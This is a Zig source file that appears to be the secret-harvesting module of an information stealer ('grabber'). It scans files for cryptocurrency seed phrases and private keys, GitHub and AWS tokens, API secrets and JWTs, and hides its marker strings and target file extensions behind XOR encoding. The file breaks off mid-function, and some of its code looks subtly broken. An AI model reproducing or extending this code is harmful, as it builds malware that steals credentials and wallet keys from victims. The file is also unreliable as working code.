const std = @import("std");
const file_io = @import("../parsers/file_io.zig");
const hash = @import("../types/hash.zig");

const E = struct {
    pub const bip39 = hash.xorEncrypt("BIP39");
    pub const btc_wif = hash.xorEncrypt("BTC_WIF");
    pub const eth_key = hash.xorEncrypt("ETH_KEY");
    pub const sol_key = hash.xorEncrypt("SOL_KEY");
    pub const xmr_key = hash.xorEncrypt("XMR_KEY");
    pub const api_key = hash.xorEncrypt("API_KEY");
    pub const jwt = hash.xorEncrypt("JWT");
    pub const jwt_marker = hash.xorEncrypt("eyJ");
    pub const aws_key = hash.xorEncrypt("AWS_KEY");
    pub const gh_token = hash.xorEncrypt("GH_TOKEN");
    pub const file_too_large = hash.xorEncrypt("file too large");
    pub const txt = hash.xorEncrypt(".txt");
    pub const doc = hash.xorEncrypt(".doc");
    pub const docx = hash.xorEncrypt(".docx");
    pub const pdf_ext = hash.xorEncrypt(".pdf");
    pub const cfg = hash.xorEncrypt(".cfg");
    pub const conf = hash.xorEncrypt(".conf");
    pub const ini = hash.xorEncrypt(".ini");
};

pub const FoundSecret = struct {
    secret_type: []const u8,
    value: []const u8,
    file_path: []const u8,
};

const MAX_FILE_SIZE: usize = 10 * 1024 * 1024;

const SECRET_TYPES = struct {
    const bip39: []const u8 = "BIP39";
    const btc_wif: []const u8 = "BTC_WIF";
    const eth_key: []const u8 = "ETH_KEY";
    const sol_key: []const u8 = "SOL_KEY";
    const xmr_key: []const u8 = "XMR_KEY";
    const api_key: []const u8 = "API_KEY";
    const jwt: []const u8 = "JWT";
    const aws_key: []const u8 = "AWS_KEY";
    const gh_token: []const u8 = "GH_TOKEN";
};

fn isLower(c: u8) bool {
    return c >= 'a' and c <= 'z';
}
fn isUpper(c: u8) bool {
    return c >= 'A' and c <= 'Z';
}
fn isDigit(c: u8) bool {
    return c >= '0' and c <= '9';
}
fn isAlpha(c: u8) bool {
    return isLower(c) or isUpper(c);
}
fn isAlnum(c: u8) bool {
    return isAlpha(c) or isDigit(c);
}
fn isHexChar(c: u8) bool {
    return isDigit(c) or (c >= 'a' and c <= 'f') or (c >= 'A' and c <= 'F');
}
fn isBase58Char(c: u8) bool {
    if (isDigit(c) and c != '0') return true;
    if (isUpper(c) and c != 'I' and c != 'O') return true;
    if (isLower(c) and c != 'l') return true;
    return false;
}
fn isBase64UrlChar(c: u8) bool {
    return isAlnum(c) or c == '_' or c == '-';
}
fn isWhitespace(c: u8) bool {
    return c == ' ' or c == '\t' or c == '\n' or c == '\r' or c == '\x0C';
}
fn isWordBoundary(c: u8) bool {
    return isWhitespace(c) or c == ',' or c == '.' or c == ';' or c == '!' or c == '?' or c == '"' or c == '\'' or c == '(' or c == ')' or c == '[' or c == ']' or c == '{' or c == '}' or c == 0;
}

fn countLeadingHex(buf: []const u8) usize {
    var i: usize = 0;
    while (i < buf.len and isHexChar(buf[i])) : (i += 1) {}
    return i;
}

fn countLeadingBase58(buf: []const u8) usize {
    var i: usize = 0;
    while (i < buf.len and isBase58Char(buf[i])) : (i += 1) {}
    return i;
}

fn countLeadingBase64Url(buf: []const u8) usize {
    var i: usize = 0;
    while (i < buf.len and isBase64UrlChar(buf[i])) : (i += 1) {}
    return i;
}

fn isAllLower(buf: []const u8) bool {
    for (buf) |c| {
        if (!isLower(c)) return false;
    }
    return true;
}

fn hasLower(buf: []const u8) bool {
    for (buf) |c| {
        if (isLower(c)) return true;
    }
    return false;
}

const BIP39_WORDS = blk: {
    @setEvalBranchQuota(50000);
    const words = [_][]const u8{
        "abandon", "ability", "able", "about", "above", "absent", "absorb", "abstract", "absurd", "abuse",
        "access", "accident", "account", "accuse", "achieve", "acid", "acoustic", "acquire", "across", "act",
        "action", "actor", "actress", "actual", "adapt", "add", "addict", "address", "adjust", "admit",
        "adult", "advance", "advice", "aerobic", "affair", "afford", "afraid", "again", "age", "agent",
        "agree", "ahead", "aim", "air", "airport", "aisle", "alarm", "album", "alcohol", "alert",
        "alien", "all", "alley", "allow", "almost", "alone", "alpha", "already", "also", "alter",
        "always", "amateur", "amazing", "among", "amount", "amused", "analyst", "anchor", "ancient", "anger",
        "angle", "angry", "animal", "ankle", "announce", "annual", "another", "answer", "antenna", "antique",
        "anxiety", "any", "apart", "apology", "appear", "apple", "approve", "april", "arch", "arctic",
        "area", "arena", "argue", "arm", "armed", "armor", "army", "around", "arrange", "arrest",
        "arrive", "arrow", "art", "artefact", "artist", "artwork", "ask", "aspect", "assault", "asset",
        "assist", "assume", "asthma", "athlete", "atom", "attack", "attend", "attitude", "attract", "auction",
        "audit", "august", "aunt", "author", "auto", "autumn", "average", "avocado", "avoid", "awake",
        "aware", "away", "awesome", "awful", "awkward", "axis", "baby", "bachelor", "bacon", "badge",
        "bag", "balance", "balcony", "ball", "bamboo", "banana", "banner", "bar", "barely", "bargain",
        "barrel", "base", "basic", "basket", "bat", "battle", "beach", "bean", "beauty", "because",
        "become", "beef", "before", "begin", "behave", "behind", "believe", "below", "belt", "bench",
        "benefit", "best", "betray", "better", "between", "beyond", "bicycle", "bid", "bike", "bind",
        "biology", "bird", "birth", "bitter", "black", "blade", "blame", "blanket", "blast", "bleak",
        "bless", "blind", "blood", "blossom", "blouse", "blue", "blur", "blush", "board", "boat",
        "body", "boil", "bomb", "bone", "bonus", "book", "boost", "border", "boring", "borrow",
        "boss", "bottom", "bounce", "box", "boy", "bracket", "brain", "brand", "brass", "brave",
        "bread", "breeze", "brick", "bridge", "brief", "bright", "bring", "brisk", "broccoli", "broken",
        "bronze", "broom", "brother", "brown", "brush", "bubble", "buddy", "budget", "buffalo", "build",
        "bulb", "bulk", "bullet", "bundle", "bunker", "burden", "burger", "burst", "bus", "business",
        "busy", "butter", "buyer", "buzz", "cabbage", "cabin", "cable", "cactus", "cage", "cake",
        "call", "calm", "camera", "camp", "can", "canal", "cancel", "candy", "cannon", "canoe",
        "canvas", "canyon", "capable", "capital", "captain", "car", "carbon", "card", "cargo", "carpet",
        "carry", "cart", "case", "cash", "casino", "castle", "casual", "cat", "catalog", "catch",
        "category", "cattle", "caught", "cause", "caution", "cave", "ceiling", "celery", "cement", "census",
        "century", "cereal", "certain", "chair", "chalk", "champion", "change", "chaos", "chapter", "charge",
        "chase", "chat", "cheap", "check", "cheese", "chef", "cherry", "chest", "chicken", "chief",
        "child", "chimney", "choice", "choose", "chronic", "chuckle", "chunk", "churn", "cigar", "cinnamon",
        "circle", "citizen", "city", "civil", "claim", "clap", "clarify", "claw", "clay", "clean",
        "clerk", "clever", "click", "client", "cliff", "climb", "clinic", "clip", "clock", "clog",
        "close", "cloth", "cloud", "clown", "club", "clump", "cluster", "clutch", "coach", "coast",
        "coconut", "code", "coffee", "coil", "coin", "collect", "color", "column", "combine", "come",
        "comfort", "comic", "common", "company", "concert", "conduct", "confirm", "congress", "connect", "consider",
        "control", "convince", "cook", "cool", "copper", "copy", "coral", "core", "corn", "correct",
        "cost", "cotton", "couch", "country", "couple", "course", "cousin", "cover", "coyote", "crack",
        "cradle", "craft", "cram", "crane", "crash", "crater", "crawl", "crazy", "cream", "credit",
        "creek", "crew", "cricket", "crime", "crisp", "critic", "crop", "cross", "crouch", "crowd",
        "crucial", "cruel", "cruise", "crumble", "crunch", "crush", "cry", "crystal", "cube", "culture",
        "cup", "cupboard", "curious", "current", "curtain", "curve", "cushion", "custom", "cute", "cycle",
        "dad", "damage", "damp", "dance", "danger", "daring", "dash", "daughter", "dawn", "day",
        "deal", "debate", "debris", "decade", "december", "decide", "decline", "decorate", "decrease", "deer",
        "defense", "define", "defy", "degree", "delay", "deliver", "demand", "demise", "denial", "dentist",
        "deny", "depart", "depend", "deposit", "depth", "deputy", "derive", "describe", "desert", "design",
        "desk", "despair", "destroy", "detail", "detect", "develop", "device", "devote", "diagram", "dial",
        "diamond", "diary", "dice", "diesel", "diet", "differ", "digital", "dignity", "dilemma", "dinner",
        "dinosaur", "direct", "dirt", "disagree", "discover", "disease", "dish", "dismiss", "disorder", "display",
        "distance", "divert", "divide", "divorce", "dizzy", "doctor", "document", "dog", "doll", "dolphin",
        "domain", "donate", "donkey", "donor", "door", "dose", "double", "dove", "draft", "dragon",
        "drama", "drastic", "draw", "dream", "dress", "drift", "drill", "drink", "drip", "drive",
        "drop", "drum", "dry", "duck", "dumb", "dune", "during", "dust", "dutch", "duty",
        "dwarf", "dynamic", "eager", "eagle", "early", "earn", "earth", "easily", "east", "easy",
        "echo", "ecology", "economy", "edge", "edit", "educate", "effort", "egg", "eight", "either",
        "elbow", "elder", "electric", "elegant", "element", "elephant", "elevator", "elite", "else", "embark",
        "embody", "embrace", "emerge", "emotion", "employ", "empower", "empty", "enable", "enact", "end",
        "endless", "endorse", "enemy", "energy", "enforce", "engage", "engine", "enhance", "enjoy", "enlist",
        "enough", "enrich", "enroll", "ensure", "enter", "entire", "entry", "envelope", "episode", "equal",
        "equip", "era", "erase", "erode", "erosion", "error", "erupt", "escape", "essay", "essence",
        "estate", "eternal", "ethics", "evidence", "evil", "evoke", "evolve", "exact", "example", "excess",
        "exchange", "excite", "exclude", "excuse", "execute", "exercise", "exhaust", "exhibit", "exile", "exist",
        "exit", "exotic", "expand", "expect", "expire", "explain", "expose", "express", "extend", "extra",
        "eye", "eyebrow", "fabric", "face", "faculty", "fade", "faint", "faith", "fall", "false",
        "fame", "family", "famous", "fan", "fancy", "fantasy", "farm", "fashion", "fat", "fatal",
        "father", "fatigue", "fault", "favorite", "feature", "february", "federal", "fee", "feed", "feel",
        "female", "fence", "festival", "fetch", "fever", "few", "fiber", "fiction", "field", "figure",
        "file", "film", "filter", "final", "find", "fine", "finger", "finish", "fire", "firm",
        "first", "fiscal", "fish", "fit", "fitness", "fix", "flag", "flame", "flash", "flat",
        "flavor", "flee", "flight", "flip", "float", "flock", "floor", "flower", "fluid", "flush",
        "fly", "foam", "focus", "fog", "foil", "fold", "follow", "food", "foot", "force",
        "foreign", "forest", "forget", "fork", "fortune", "forum", "forward", "fossil", "foster", "found",
        "fox", "fragile", "frame", "frequent", "fresh", "friend", "fringe", "frog", "front", "frost",
        "frown", "frozen", "fruit", "fuel", "fun", "funny", "furnace", "fury", "future", "gadget",
        "gain", "galaxy", "gallery", "game", "gap", "garage", "garbage", "garden", "garlic", "garment",
        "gas", "gasp", "gate", "gather", "gauge", "gaze", "general", "genius", "genre", "gentle",
        "genuine", "gesture", "ghost", "giant", "gift", "giggle", "ginger", "giraffe", "girl", "give",
        "glad", "glance", "glare", "glass", "glide", "glimpse", "globe", "gloom", "glory", "glove",
        "glow", "glue", "goat", "goddess", "gold", "good", "goose", "gorilla", "gospel", "gossip",
        "govern", "gown", "grab", "grace", "grain", "grant", "grape", "grass", "gravity", "great",
        "green", "grid", "grief", "grit", "grocery", "group", "grow", "grunt", "guard", "guess",
        "guide", "guilt", "guitar", "gun", "gym", "habit", "hair", "half", "hammer", "hamster",
        "hand", "happy", "harbor", "hard", "harsh", "harvest", "hat", "have", "hawk", "hazard",
        "head", "health", "heart", "heavy", "hedgehog", "height", "hello", "helmet", "help", "hen",
        "hero", "hidden", "high", "hill", "hint", "hip", "hire", "history", "hobby", "hockey",
        "hold", "hole", "holiday", "hollow", "home", "honey", "hood", "hope", "horn", "horror",
        "horse", "hospital", "host", "hotel", "hour", "hover", "hub", "huge", "human", "humble",
        "humor", "hundred", "hungry", "hunt", "hurdle", "hurry", "hurt", "husband", "hybrid", "ice",
        "icon", "idea", "identify", "idle", "ignore", "ill", "illegal", "illness", "image", "imitate",
        "immense", "immune", "impact", "impose", "improve", "impulse", "inch", "include", "income", "increase",
        "index", "indicate", "indoor", "industry", "infant", "inflict", "inform", "inhale", "inherit", "initial",
        "inject", "injury", "inmate", "inner", "innocent", "input", "inquiry", "insane", "insect", "inside",
        "inspire", "install", "intact", "interest", "into", "invest", "invite", "involve", "iron", "island",
        "isolate", "issue", "item", "ivory", "jacket", "jaguar", "jar", "jazz", "jealous", "jeans",
        "jelly", "jewel", "job", "join", "joke", "journey", "joy", "judge", "juice", "jump",
        "jungle", "junior", "junk", "just", "kangaroo", "keen", "keep", "ketchup", "key", "kick",
        "kid", "kidney", "kind", "kingdom", "kiss", "kit", "kitchen", "kite", "kitten", "kiwi",
        "knee", "knife", "knock", "know", "lab", "label", "labor", "ladder", "lady", "lake",
        "lamp", "language", "laptop", "large", "later", "latin", "laugh", "laundry", "lava", "law",
        "lawn", "lawsuit", "layer", "lazy", "leader", "leaf", "learn", "leave", "lecture", "left",
        "leg", "legal", "legend", "leisure", "lemon", "lend", "length", "lens", "leopard", "lesson",
        "letter", "level", "liar", "liberty", "library", "license", "life", "lift", "light", "like",
        "limb", "limit", "link", "lion", "liquid", "list", "little", "live", "lizard", "load",
        "loan", "lobster", "local", "lock", "logic", "lonely", "long", "loop", "lottery", "loud",
        "lounge", "love", "loyal", "lucky", "luggage", "lumber", "lunar", "lunch", "luxury", "lyrics",
        "machine", "mad", "magic", "magnet", "maid", "mail", "main", "major", "make", "mammal",
        "man", "manage", "mandate", "mango", "mansion", "manual", "maple", "marble", "march", "margin",
        "marine", "market", "marriage", "mask", "mass", "master", "match", "material", "math", "matrix",
        "matter", "maximum", "maze", "meadow", "mean", "measure", "meat", "mechanic", "medal", "media",
        "melody", "melt", "member", "memory", "mention", "menu", "mercy", "merge", "merit", "merry",
        "mesh", "message", "metal", "method", "middle", "midnight", "milk", "million", "mimic", "mind",
        "minimum", "minor", "minute", "miracle", "mirror", "misery", "miss", "mistake", "mix", "mixed",
        "mixture", "mobile", "model", "modify", "mom", "moment", "monitor", "monkey", "monster", "month",
        "moon", "moral", "more", "morning", "mosquito", "mother", "motion", "motor", "mountain", "mouse",
        "move", "movie", "much", "muffin", "mule", "multiply", "muscle", "museum", "mushroom", "music",
        "must", "mutual", "myself", "mystery", "myth", "naive", "name", "napkin", "narrow", "nasty",
        "nation", "nature", "near", "neck", "need", "negative", "neglect", "neither", "nephew", "nerve",
        "nest", "net", "network", "neutral", "never", "news", "next", "nice", "night", "noble",
        "noise", "nominee", "noodle", "normal", "north", "nose", "notable", "note", "nothing", "notice",
        "novel", "now", "nuclear", "number", "nurse", "nut", "oak", "obey", "object", "oblige",
        "obscure", "observe", "obtain", "obvious", "occur", "ocean", "october", "odor", "off", "offer",
        "office", "often", "oil", "okay", "old", "olive", "olympic", "omit", "once", "one",
        "onion", "online", "only", "open", "opera", "opinion", "oppose", "option", "orange", "orbit",
        "orchard", "order", "ordinary", "organ", "orient", "original", "orphan", "ostrich", "other", "outdoor",
        "outer", "output", "outside", "oval", "oven", "over", "own", "owner", "oxygen", "oyster",
        "ozone", "pact", "paddle", "page", "pair", "palace", "palm", "panda", "panel", "panic",
        "panther", "paper", "parade", "parent", "park", "parrot", "party", "pass", "patch", "path",
        "patient", "patrol", "pattern", "pause", "pave", "payment", "peace", "peanut", "pear", "peasant",
        "pelican", "pen", "penalty", "pencil", "people", "pepper", "perfect", "permit", "person", "pet",
        "phone", "photo", "phrase", "physical", "piano", "picnic", "picture", "piece", "pig", "pigeon",
        "pill", "pilot", "pink", "pioneer", "pipe", "pistol", "pitch", "pizza", "place", "planet",
        "plastic", "plate", "play", "player", "pleasure", "plenty", "plot", "pluck", "plug", "plunge",
        "poem", "poet", "point", "polar", "pole", "police", "pond", "pony", "pool", "popular",
        "portion", "position", "possible", "post", "potato", "pottery", "poverty", "powder", "power", "practice",
        "praise", "predict", "prefer", "prepare", "present", "pretty", "prevent", "price", "pride", "primary",
        "print", "priority", "prison", "private", "prize", "problem", "process", "produce", "profit", "program",
        "project", "promote", "proof", "property", "prosper", "protect", "proud", "provide", "public", "pudding",
        "pull", "pulp", "pulse", "pumpkin", "punch", "pupil", "puppy", "purchase", "purity", "purpose",
        "purse", "push", "put", "puzzle", "pyramid", "quality", "quantum", "quarter", "question", "quick",
        "quit", "quiz", "quote", "rabbit", "raccoon", "race", "rack", "radar", "radio", "rail",
        "rain", "raise", "rally", "ramp", "ranch", "random", "range", "rapid", "rare", "rate",
        "rather", "raven", "raw", "razor", "ready", "real", "reason", "rebel", "rebuild", "recall",
        "receive", "recipe", "record", "recycle", "reduce", "reflect", "reform", "refuse", "region", "regret",
        "regular", "reject", "relax", "release", "relief", "rely", "remain", "remember", "remind", "remove",
        "render", "renew", "rent", "reopen", "repair", "repeat", "replace", "report", "require", "rescue",
        "resemble", "resist", "resource", "response", "result", "retire", "retreat", "return", "reunion", "reveal",
        "review", "reward", "rhythm", "rib", "ribbon", "rice", "rich", "ride", "ridge", "rifle",
        "right", "rigid", "ring", "riot", "ripple", "risk", "ritual", "rival", "river", "road",
        "roast", "robot", "robust", "rocket", "romance", "roof", "rookie", "room", "rose", "rotate",
        "rough", "round", "route", "royal", "rubber", "rude", "rug", "rule", "run", "runway",
        "rural", "sad", "saddle", "sadness", "safe", "sail", "salad", "salmon", "salon", "salt",
        "salute", "same", "sample", "sand", "satisfy", "satoshi", "sauce", "sausage", "save", "say",
        "scale", "scan", "scare", "scatter", "scene", "scheme", "school", "science", "scissors", "scorpion",
        "scout", "scrap", "screen", "script", "scrub", "sea", "search", "season", "seat", "second",
        "secret", "section", "security", "seed", "seek", "segment", "select", "sell", "seminar", "senior",
        "sense", "sentence", "series", "service", "session", "settle", "setup", "seven", "shadow", "shaft",
        "shallow", "share", "shed", "shell", "sheriff", "shield", "shift", "shine", "ship", "shiver",
        "shock", "shoe", "shoot", "shop", "short", "shoulder", "shove", "shrimp", "shrug", "shuffle",
        "shy", "sibling", "sick", "side", "siege", "sight", "sign", "silent", "silk", "silly",
        "silver", "similar", "simple", "since", "sing", "siren", "sister", "situate", "six", "size",
        "skate", "sketch", "ski", "skill", "skin", "skirt", "skull", "slab", "slam", "sleep",
        "slender", "slice", "slide", "slight", "slim", "slogan", "slot", "slow", "slush", "small",
        "smart", "smile", "smoke", "smooth", "snack", "snake", "snap", "sniff", "snow", "soap",
        "soccer", "social", "sock", "soda", "soft", "solar", "soldier", "solid", "solution", "solve",
        "someone", "song", "soon", "sorry", "sort", "soul", "sound", "soup", "source", "south",
        "space", "spare", "spatial", "spawn", "speak", "special", "speed", "spell", "spend", "sphere",
        "spice", "spider", "spike", "spin", "spirit", "split", "spoil", "sponsor", "spoon", "sport",
        "spot", "spray", "spread", "spring", "spy", "square", "squeeze", "squirrel", "stable", "stadium",
        "staff", "stage", "stairs", "stamp", "stand", "start", "state", "stay", "steak", "steel",
        "stem", "step", "stereo", "stick", "still", "sting", "stock", "stomach", "stone", "stool",
        "story", "stove", "strategy", "street", "strike", "strong", "struggle", "student", "stuff", "stumble",
        "style", "subject", "submit", "subway", "success", "such", "sudden", "suffer", "sugar", "suggest",
        "suit", "sun", "sunny", "sunset", "super", "supply", "support", "suppose", "sure", "surface",
        "surge", "surprise", "surround", "survey", "suspect", "sustain", "swallow", "swamp", "swap", "swarm",
        "swear", "sweet", "swift", "swim", "swing", "switch", "sword", "symbol", "symptom", "syrup",
        "system", "table", "tackle", "tag", "tail", "talent", "talk", "tank", "tape", "target",
        "task", "taste", "tattoo", "taxi", "teach", "team", "tell", "ten", "tenant", "tennis",
        "tent", "term", "test", "text", "thank", "that", "theme", "then", "theory", "there",
        "they", "thing", "this", "thought", "three", "thrive", "throw", "thumb", "thunder", "ticket",
        "tide", "tiger", "tilt", "timber", "time", "tiny", "tip", "tired", "tissue", "title",
        "toast", "tobacco", "today", "toddler", "toe", "together", "toilet", "token", "tomato", "tomorrow",
        "tone", "tongue", "tonight", "tool", "tooth", "top", "topic", "topple", "torch", "tornado",
        "tortoise", "toss", "total", "tourist", "toward", "tower", "town", "toy", "track", "trade",
        "traffic", "tragic", "train", "transfer", "trap", "trash", "travel", "tray", "treat", "tree",
        "trend", "trial", "tribe", "trick", "trigger", "trim", "trip", "trophy", "trouble", "truck",
        "true", "truly", "trumpet", "trust", "truth", "try", "tube", "tuition", "tumble", "tuna",
        "tunnel", "turkey", "turn", "turtle", "twelve", "twenty", "twice", "twin", "twist", "two",
        "type", "typical", "ugly", "umbrella", "unable", "unaware", "uncle", "uncover", "under", "undo",
        "unfair", "unfold", "unhappy", "uniform", "unique", "unit", "universe", "unknown", "unlock", "until",
        "unusual", "unveil", "update", "upgrade", "uphold", "upon", "upper", "upset", "urban", "urge",
        "usage", "use", "used", "useful", "useless", "usual", "utility", "vacant", "vacuum", "vague",
        "valid", "valley", "valve", "van", "vanish", "vapor", "various", "vast", "vault", "vehicle",
        "velvet", "vendor", "venture", "venue", "verb", "verify", "version", "very", "vessel", "veteran",
        "viable", "vibrant", "vicious", "victory", "video", "view", "village", "vintage", "violin", "virtual",
        "virus", "visa", "visit", "visual", "vital", "vivid", "vocal", "voice", "void", "volcano",
        "volume", "vote", "voyage", "wage", "wagon", "wait", "walk", "wall", "walnut", "want",
        "warfare", "warm", "warrior", "wash", "wasp", "waste", "water", "wave", "way", "wealth",
        "weapon", "wear", "weasel", "weather", "web", "wedding", "weekend", "weird", "welcome", "west",
        "wet", "whale", "what", "wheat", "wheel", "when", "where", "whip", "whisper", "wide",
        "width", "wife", "wild", "will", "win", "window", "wine", "wing", "wink", "winner",
        "winter", "wire", "wisdom", "wise", "wish", "witness", "wolf", "woman", "wonder", "wood",
        "wool", "word", "work", "world", "worry", "worth", "wrap", "wreck", "wrestle", "wrist",
        "write", "wrong", "yard", "year", "yellow", "you", "young", "youth", "zebra", "zero",
        "zone", "zoo",
    };

    var sorted = words;
    std.mem.sortUnstable([]const u8, &sorted, {}, struct {
        fn lt(_: void, a: []const u8, b: []const u8) bool {
            return std.mem.order(u8, a, b) == .lt;
        }
    }.lt);
    break :blk sorted;
};

fn isBip39Word(word: []const u8) bool {
    if (word.len < 3 or word.len > 8) return false;
    if (!isAllLower(word)) return false;
    const pos = std.sort.binarySearch([]const u8, word, &BIP39_WORDS, {}, struct {
        fn cmp(_: void, a: []const u8, b: []const u8) std.math.Order {
            return std.mem.order(u8, a, b);
        }
    }.cmp);
    return pos != null;
}

fn extractApiValue(buf: []const u8, start: usize) ?usize {
    var i = start;
    while (i < buf.len and (buf[i] == '=' or buf[i] == ':' or buf[i] == '"' or buf[i] == '\'' or isWhitespace(buf[i]))) : (i += 1) {}
    if (i >= buf.len) return null;
    const quote = if (buf[i] == '"' or buf[i] == '\'') buf[i] else 0;
    if (quote != 0) i += 1;
    const val_start = i;
    if (quote != 0) {
        while (i < buf.len and buf[i] != quote) : (i += 1) {}
    } else {
        while (i < buf.len and !isWhitespace(buf[i]) and buf[i] != ',' and buf[i] != ';' and buf[i] != '"' and buf[i] != '\'') : (i += 1) {}
    }
    const len = i - val_start;
    if (len >= 16 and len <= 64) return val_start;
    return null;
}

fn scanBip39(buffer: []const u8, allocator: std.mem.Allocator, results: *std.ArrayList(FoundSecret), file_path: []const u8) !void {
    var i: usize = 0;
    while (i < buffer.len) {
        while (i < buffer.len and !isWordBoundary(buffer[i])) : (i += 1) {}
        while (i < buffer.len and isWordBoundary(buffer[i]) and !isLower(buffer[i])) : (i += 1) {}
        if (i >= buffer.len) break;
        while (i < buffer.len and isWordBoundary(buffer[i])) : (i += 1) {
            if (i < buffer.len and isLower(buffer[i])) break;
        }
        if (i >= buffer.len) break;
        const actual_start = i;
        while (i < buffer.len and isLower(buffer[i])) : (i += 1) {}
        if (i == actual_start) {
            i += 1;
            continue;
        }
        const word = buffer[actual_start..i];
        if (isBip39Word(word)) {
            const phrase_start = actual_start;
            var word_count: usize = 1;
            while (i < buffer.len) {
                while (i < buffer.len and isWordBoundary(buffer[i]) and !isLower(buffer[i])) : (i += 1) {}
                if (i >= buffer.len) break;
                const next_start = i;
                while (i < buffer.len and isLower(buffer[i])) : (i += 1) {}
                if (i == next_start) break;
                const next_word = buffer[next_start..i];
                if (isBip39Word(next_word)) {
                    word_count += 1;
                } else {
                    break;
                }
            }
            if (word_count == 12 or word_count == 15 or word_count == 18 or word_count == 21 or word_count == 24) {
                var end = phrase_start;
                var count: usize = 0;
                while (count < word_count and end < buffer.len) {
                    while (end < buffer.len and isWordBoundary(end)) : (end += 1) {}
                    while (end < buffer.len and !isWordBoundary(end)) : (end += 1) {}
                    count += 1;
                }
                const phrase = buffer[phrase_start..end];
                if (phrase.len > 0) {
                    try results.append(FoundSecret{
                        .secret_type = SECRET_TYPES.bip39,
                        .value = try allocator.dupe(u8, phrase),
                        .file_path = file_path,
                    });
                }
            }
        }
    }
}

fn scanPrivateKeys(buffer: []const u8, allocator: std.mem.Allocator, results: *std.ArrayList(FoundSecret), file_path: []const u8) !void {
    var i: usize = 0;
    while (i < buffer.len) {
        const c = buffer[i];

        if ((c == '5' or c == 'K' or c == 'L') and i + 50 < buffer.len) {
            const len = countLeadingBase58(buffer[i..]);
            if (len >= 51 and len <= 52) {
                try results.append(FoundSecret{
                    .secret_type = SECRET_TYPES.btc_wif,
                    .value = try allocator.dupe(u8, buffer[i .. i + len]),
                    .file_path = file_path,
                });
                i += len;
                continue;
            }
        }

        if (c == '0' and i + 1 < buffer.len and buffer[i + 1] == 'x') {
            const hex_len = countLeadingHex(buffer[i + 2 ..]);
            if (hex_len == 64) {
                try results.append(FoundSecret{
                    .secret_type = SECRET_TYPES.eth_key,
                    .value = try allocator.dupe(u8, buffer[i .. i + 2 + hex_len]),
                    .file_path = file_path,
                });
                i += 2 + hex_len;
                continue;
            }
        }

        if (isHexChar(c)) {
            const hex_len = countLeadingHex(buffer[i..]);
            if (hex_len == 64) {
                const before = if (i > 0) buffer[i - 1] else 0;
                if (before != 'x' and before != 'X') {
                    try results.append(FoundSecret{
                        .secret_type = SECRET_TYPES.eth_key,
                        .value = try allocator.dupe(u8, buffer[i .. i + hex_len]),
                        .file_path = file_path,
                    });
                }
                i += hex_len;
                continue;
            }
        }

        if (isBase58Char(c)) {
            const len = countLeadingBase58(buffer[i..]);
            if (len >= 87 and len <= 88) {
                try results.append(FoundSecret{
                    .secret_type = SECRET_TYPES.sol_key,
                    .value = try allocator.dupe(u8, buffer[i .. i + len]),
                    .file_path = file_path,
                });
                i += len;
                continue;
            }
        }

        i += 1;
    }
}

fn scanApiKeys(buffer: []const u8, allocator: std.mem.Allocator, results: *std.ArrayList(FoundSecret), file_path: []const u8) !void {
    const patterns = [_]struct { prefix: []const u8, min_val: usize, max_val: usize }{
        .{ .prefix = "ghp_", .min_val = 36, .max_val = 40 },
        .{ .prefix = "gho_", .min_val = 36, .max_val = 40 },
        .{ .prefix = "ghu_", .min_val = 36, .max_val = 40 },
        .{ .prefix = "AKIA", .min_val = 16, .max_val = 20 },
    };

    for (patterns) |p| {
        var pos: usize = 0;
        while (std.mem.indexOf(u8, buffer[pos..], p.prefix)) |match| {
            const idx = pos + match;
            const after = idx + p.prefix.len;
            if (after < buffer.len) {
                const remaining = buffer[after..];
                var val_len: usize = 0;
                while (val_len < remaining.len and (isAlnum(remaining[val_len]) or remaining[val_len] == '_' or remaining[val_len] == '-')) : (val_len += 1) {}
                if (val_len >= p.min_val and val_len <= p.max_val) {
                    try results.append(FoundSecret{
                        .secret_type = if (std.mem.eql(u8, p.prefix, "AKIA")) SECRET_TYPES.aws_key else SECRET_TYPES.gh_token,
                        .value = try allocator.dupe(u8, buffer[idx .. idx + p.prefix.len + val_len]),
                        .file_path = file_path,
                    });
                }
            }
            pos = idx + 1;
        }
    }

    const keywords = [_][]const u8{ "api_key", "apikey", "api-key", "api_secret", "api_secret", "secret", "token" };
    for (keywords) |kw| {
        var pos: usize = 0;
        while (std.mem.indexOf(u8, buffer[pos..], kw)) |match| {
            const idx = pos + match;
            const after = idx + kw.len;
            if (after < buffer.len) {
                if (extractApiValue(buffer, after)) |val_start| {
                    var val_end = val_start;
                    while (val_end < buffer.len and !isWhitespace(buffer[val_end]) and buffer[val_end] != ',' and buffer[val_end] != ';' and buffer[val_end] != '"' and buffer[val_end] != '\'') : (val_end += 1) {}
                    if (val_end - val_start >= 16) {
                        const cap = val_end - val_start;
                        const actual_end = if (cap > 64) val_start + 64 else val_end;
                        try results.append(FoundSecret{
                            .secret_type = SECRET_TYPES.api_key,
                            .value = try allocator.dupe(u8, buffer[val_start..actual_end]),
                            .file_path = file_path,
                        });
                    }
                }
            }
            pos = idx + 1;
        }
    }
}

fn scanJwt(buffer: []const u8, allocator: std.mem.Allocator, results: *std.ArrayList(FoundSecret), file_path: []const u8) !void {
    var jwt_marker_buf: [E.jwt_marker.len]u8 = undefined;
    hash.xorDecrypt(&E.jwt_marker, &jwt_marker_buf);
    var pos: usize = 0;
    while (std.mem.indexOf(u8, buffer[pos..], jwt_marker_buf[0..])) |match| {
        const idx = pos + match;
        const remaining = buffer[idx..];
        var dot_count: u32 = 0;
        var seg_lens: [3]usize = .{ 0, 0, 0 };
        var seg_start: usize = 0;
        var j: usize = 0;
        while (j < remaining.len) {
            if (remaining[j] == '.') {
                if (dot_count >= 2) break;
                if (dot_count == 0) {
                    seg_lens[0] = j;
                } else if (dot_count == 1) {
                    seg_lens[1] = j - seg_start;
                }
                dot_count += 1;
                seg_start = j + 1;
                j += 1;
            } else if (isBase64UrlChar(remaining[j])) {
                j += 1;
            } else {
                break;
            }
        }
        if (dot_count >= 2) {
            seg_lens[2] = (j - seg_start);
            if (seg_lens[0] >= 20 and seg_lens[1] >= 20 and seg_lens[2] >= 20) {
                const total = seg_lens[0] + seg_lens[1] + seg_lens[2] + 2;
                try results.append(FoundSecret{
                    .secret_type = SECRET_TYPES.jwt,
                    .value = try allocator.dupe(u8, remaining[0..total]),
                    .file_path = file_path,
                });
            }
        }
        pos = idx + 1;
    }
}

fn hasGrabberExtension(name: []const u8) bool {
    var txt_buf: [E.txt.len]u8 = undefined;
    hash.xorDecrypt(&E.txt, &txt_buf);
    var doc_buf: [E.doc.len]u8 = undefined;
    hash.xorDecrypt(&E.doc, &doc_buf);
